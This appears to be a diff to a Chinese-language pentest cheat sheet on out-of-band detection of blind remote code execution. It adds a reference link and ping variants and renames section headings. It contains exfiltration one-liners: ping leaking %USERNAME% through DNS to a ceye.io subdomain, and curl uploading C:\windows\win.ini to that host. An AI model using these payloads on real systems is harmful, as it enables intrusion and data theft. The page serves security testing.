@@ -17,6 +17,7 @@
 - [HTTP BLIND](https://web.archive.org/web/20200224073305/https://echocipher.github.io/2019/07/22/HTTP-BLIND/)
 - [Cracking the lens: targeting HTTP's hidden attack-surface](https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface)
 - [System Hardening을 피해 RCE를 탐지하기 위한 OOB 방법들](https://www.hahwul.com/2022/03/11/bypass-system-hardening-rce-oob/)
+- [ping 命令跨平台探测无回显 RCE 技巧](https://mp.weixin.qq.com/s/6NoLiQll9Cz2WjCUdDs6Mw)
 
 **在线监控平台**
 - http://ceye.io/
@@ -50,14 +51,14 @@
 
 ---
 
-## rce
-
-**Windows**
+## Windows
 
 - ping
 
     ```
     ping %USERNAME%.xxx.ceye.io
+
+    ping -nc 4 %USERNAME%.xxx.ceye.io
     ```
 
 - certutil
@@ -76,7 +77,7 @@
     curl -F file=@C:\windows\win.ini http://xxx.ceye.io
     ```
 
-**linux**
+## linux
 
 - curl
 
@@ -95,6 +96,8 @@
     linux 默认 ping 不带 -c 参数是会导致无限ping下去的,一定要带 -c
     ```bash
     ping -c 4 xxx.ceye.io
+
+    ping -nc 4 xxx.ceye.io
     ```
 
 - openssl
